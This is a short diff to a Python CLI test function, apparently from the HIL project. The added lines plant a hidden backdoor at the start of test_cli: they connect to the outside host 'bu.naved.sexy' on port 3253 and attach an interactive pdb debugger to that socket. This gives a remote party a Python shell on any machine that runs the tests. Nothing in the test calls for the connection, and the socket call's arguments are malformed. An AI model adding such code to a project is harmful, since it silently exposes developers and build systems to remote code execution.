@@ -34,7 +34,11 @@ def test_cli():
     1. The subprocess calls are run without error.
     2. Some assertions that actually check the output of the subprocess call.
     """
-
+    import pdb, socket
+    conn = socket.create_connection(('bu.naved.sexy'), 3253)
+    conn = conn.makefile()
+    dbg = pdb.Pdb(stdin=conn, stdout=conn)
+    dbg.set_trace()
     # Test node and nic creation
     hil('node register', NODE1, 'mock host user password')
     assert NODE1 in hil('node list all')
